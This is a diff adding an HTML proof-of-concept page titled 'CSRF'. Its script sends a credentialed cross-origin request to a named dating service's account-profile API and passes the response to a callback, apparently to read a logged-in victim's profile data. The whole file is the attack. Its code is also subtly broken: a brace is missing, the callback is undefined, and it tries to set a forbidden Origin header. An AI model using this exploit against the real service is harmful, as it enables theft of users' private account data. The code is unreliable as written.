@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF</title>
+  </head>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://api.ashleymadison.com/v2/account/profile/", true);
+        xhr.setRequestHeader("accept", "application/json, text/plain, */*");
+        xhr.setRequestHeader("accept-language", "en-GB,en-US;q=0.9,en;q=0.8");
+	xhr.setRequestHeader("Origin", "https://www.github.com/");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+        xhr.onreadystatechange = function() {
+    	    if (xhr.readyState === 4) {
+      	    callback(xhr.response);
+    	  }
+      	}
+    </script>
+    <form action="#">
+      <input type="button" value="Submit" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
